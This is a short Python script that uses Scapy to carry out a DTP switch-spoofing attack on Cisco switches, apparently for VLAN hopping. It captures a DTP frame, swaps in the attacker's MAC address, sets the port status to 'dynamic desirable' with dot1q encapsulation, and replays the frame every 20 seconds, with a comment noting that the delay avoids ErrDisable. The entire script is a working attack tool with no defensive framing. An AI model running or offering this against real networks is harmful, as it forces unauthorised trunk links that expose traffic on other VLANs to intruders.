#!/usr/bin/env python3

#Import Scapy
from scapy.all import *

#Load DTP
load_contrib("dtp")

#Specify Interface
interface = input("Enter the Network Interface (example eth0) : ")

#Specify MAC Address
devMac = input("Enter your Device MAC Address : ")

#Capture a DTP frame
print("Capturing DTP Packet....")
packet = sniff(iface=interface, filter="ether dst 01:00:0c:cc:cc:cc", count=1)
print("Packet Captured")

print("Modifying Packet....")
#Modify the Source Mac Address
packet[0].src = devMac

#Modify the Neighbor Mac Address to Match src
packet[0][DTP][DTPNeighbor].neighbor = devMac

#Change DTP Status
# 0x04 -> dynamic auto | 0x03 -> dynamic desirable
packet[0][DTP][DTPStatus].status = "\x03"

#Modify DTP Type From Negotiated to Dot1q
packet[0][DTP][DTPType].dtptype = "E"

print("Packet Modified")
#Fire up the packet
while True:
    #Time delay to avoid ErrDisable
    time.sleep(20)

    #send packet
    sendp(packet[0], iface=interface, verbose=1)